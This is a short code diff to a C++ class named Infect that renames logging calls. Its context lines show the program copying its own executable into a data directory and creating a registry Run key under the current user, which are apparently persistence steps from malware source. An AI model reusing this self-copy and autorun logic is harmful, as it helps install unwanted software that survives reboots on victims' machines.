@@ -10,13 +10,13 @@ Infect *Infect::s_Infect = nullptr;
 
 Infect::Infect()
 {
-	Log::Info(L"Infect", L"Initialize infect class");
+	LogInfo(L"Infect", L"Initialize infect class");
 }
 
 
 Infect::~Infect()
 {
-	Log::Info(L"Infect", L"Terminate infect class");
+	LogInfo(L"Infect", L"Terminate infect class");
 }
 
 
@@ -42,7 +42,7 @@ void Infect::SetupHomeDirectory()
 		return;
 	}
 
-	Log::Info(L"Infect", L"Copy to application directory");
+	LogInfo(L"Infect", L"Copy to application directory");
 
 	Util::deleteFile(fullAppDir.c_str());
 	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)fullAppDir.c_str());
@@ -57,7 +57,7 @@ void Infect::SetupHomeDirectory()
 
 void Infect::SetupRegisterHook()
 {
-	Log::Info(L"Infect", L"Set register hooks");
+	LogInfo(L"Infect", L"Set register hooks");
 
 	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegisterRun(Config::Current()->Variant()));
 	std::wstring appDir = Config::Current()->DataDirectory();
